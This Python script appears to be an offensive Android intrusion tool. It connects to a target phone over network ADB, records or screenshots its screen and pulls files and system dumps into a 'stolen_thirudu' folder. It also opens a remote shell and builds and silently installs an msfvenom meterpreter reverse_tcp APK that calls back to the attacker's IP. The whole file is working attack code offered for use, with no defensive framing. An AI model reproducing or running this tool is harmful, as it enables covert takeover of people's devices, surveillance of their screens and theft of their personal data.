import os
import datetime
import time
import readline

readline.parse_and_bind("tab: complete")

#appname_setup
TIME = datetime.datetime.now()
NAME = str(TIME.minute)+str(TIME.second)

APPNAME = 'FUDpayload_'+NAME+'.apk'

def banner():
    logo = open('ezhuthukal/jHoBeRxQ_dE.txt','r').read()
    os.system('clear')
    print(logo)
    print()
    os.system('adb start-server')

    os.system('adb tcpip 5555')
    print()

def conn():
    t_ip = input('Target ip address : ').split(':')

    if len(t_ip)==2:
        os.system('adb connect '+t_ip[0]+':'+t_ip[1])
    elif t_ip[0]=='1':
        os.system('adb connect '+'192.168.43.1:'+'5555')
    elif len(t_ip)==1:

        port = input("target's port (default = 5555): ")

        if port =="" or port=='5555':
            os.system('adb connect '+t_ip[0]+':'+'5555')

        else:
            os.system('adb connect '+t_ip[0]+':'+port)


    else:

        print('incorrect input')
        print()
        conn()

def payload_inject():
    os.system('adb install aayutham/'+APPNAME)
    time.sleep(3)
    os.system('adb shell monkey -p com.metasploit.stage -v 500')

def payload_creator():
    r_ip = input('Hackers/yours ip address : ')
    r_port = input('enter the port (default = 4444): ')
    if r_port == '' or r_port == '4444':
        os.system('msfvenom -p android/meterpreter/reverse_tcp \
        LHOST = '+r_ip+' LPORT = 4444 '+'o > aayutham/'+APPNAME)

        print('injecting payload ......')
        time.sleep(3)

        payload_inject()
        print('injected')
        metas()

    else:
        os.system('msfvenom -p android/meterpreter/reverse_tcp \
        LHOST = '+r_ip+' LPORT = '+r_port+' o > aayutham/'+APPNAME)
        print('injecting payload ......')
        payload_inject()
        print('injected')
        metas()


def screen_casting():
    stealcmd = open('ezhuthukal/hRoBmWTPvA.txt','r').read()
    print(stealcmd)
    print()
    print('#############')
    print()
    while True:
        steal = input('FUD@whitehauler/screen# ').split(' ')
        if steal[0] == 'screenrec':
            #s = input('Enter timeout in seconds: ')
            print('press "ctrl+c" to stop recording')
            os.system('adb shell screenrecord /sdcard/screen'+NAME+'.mp4')
            time.sleep(1)
            os.system('adb pull /sdcard/screen'+NAME+'.mp4 '+'stolen_thirudu/')
            time.sleep(1)
            os.system('adb shell rm /sdcard/screen'+NAME+'.mp4')
        elif steal[0] == 'exit' or steal[0] == 'back':
            break
        elif steal[0] == 'screenshot':
            os.system('adb shell screencap /sdcard/screencap'+NAME+'.png')
            time.sleep(1)
            os.system('adb pull /sdcard/screencap'+NAME+'.png '+'stolen_thirudu/')
            time.sleep(1)
            os.system('adb shell rm /sdcard/screencap'+NAME+'.png')

def systools():
    syst = open('ezhuthukal/YuDbEwBNC.txt','r').read()
    print(syst)
    while True:
        systm = input('FUD@whitehauler/sys # ')
        if systm == 'sys' or systm == 'info':
            print('Please wait....')
            os.system('adb shell dumpsys > stolen_thirudu/dump_'+NAME+'.txt')
            print('dump data saved as stolen_thirudu/dump_'+NAME+'.txt')
        elif systm == 'netstat':
            print()
            os.system('adb shell netstat')
        elif systm == 'inet':
            print()
            os.system('adb shell ip address show wlan0')
        elif systm == 'battery':
            print()
            os.system('adb shell dumpsys battery')
        elif systm == 'activity':
            print()
            os.system('adb shell dumpsys activity')
        elif systm == 'back':
            break
        elif systm == 'exit':
            quit()
        else:
            print(systm+':cmd invalid ')

def fileOperation():
    f = open('ezhuthukal/gHUyTgbnOiW.txt','r').read()
    print(f)
    while True:
        file = input('FUD@whitehauler/file # ').split(' ')
        if len(file) == 2 and file[0] == 'download':
            os.system('adb pull '+file[1]+' '+'stolen_thirudu/')
        elif len(file) == 1 and file[0] == 'shell':
            print('type "exit" to quit shell')
            print('#####################')
            os.system('adb shell')
        elif len(file) == 3 and file[0] == 'upload':
            if len(file) == 3:
                os.system('adb push '+file[1]+' '+file[2])
            else:
                print('directory error')
        elif file[0] == 'exit':
            break
        else:
            print('"'+file[0]+'"'+' not a command')

def disconn():
    os.system('adb disconnect')
    os.system('exit && exit')

def metas():
    metasploit = input('do you want to launch metasploit (y/n): ')
    if metasploit == 'y':
        print('launching..')
        os.system('msfconsole')
    else:
        pass


#systools()
#screen_casting()

#fileOperation()

#disconn()
#def main():
#    banner()
#    conn()

banner()
conn()

print()
print('\033[4mMENU\033[0m')
print()
README = open('ezhuthukal/menu.txt','r').read()
print(README)
print()
while True:
    fud = input('fud@WhiteDot# ')

    if fud == '1':
        screen_casting()
    elif fud == '2':
        fileOperation()
    elif fud == '3':
        systools()
    elif fud == 'exit' or fud == '6':
        quit()
    elif fud == 'README'or fud == '5':
        print()
        print('\033[4mMENU\033[0m')
        print()
        README = open('ezhuthukal/menu.txt','r').read()
        print(README)
    elif fud == '':
        pass
    elif fud == '4':
        pay = input('Do you have metasploit (y/n): ')
        if pay == 'y' or pay == 'Y':
            payload_creator()
        else:
            print('Installing metasploit...')
            os.system('sudo apt install metasploit')
    else:
        print(fud+':unknown'+' enter valid command')
